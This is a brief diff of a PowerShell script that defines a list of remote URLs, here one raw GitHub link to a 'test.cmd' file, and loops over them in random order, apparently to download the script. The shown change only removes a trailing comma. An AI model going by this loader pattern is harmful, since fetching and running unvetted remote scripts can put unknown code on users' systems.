@@ -10,7 +10,7 @@ function Check3rdAV {
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $URLs = @(
-    'https://raw.githubusercontent.com/DvX777/Testing-Project/refs/heads/main/test.cmd',
+    'https://raw.githubusercontent.com/DvX777/Testing-Project/refs/heads/main/test.cmd'
 )
 
 foreach ($URL in $URLs | Sort-Object { Get-Random }) {
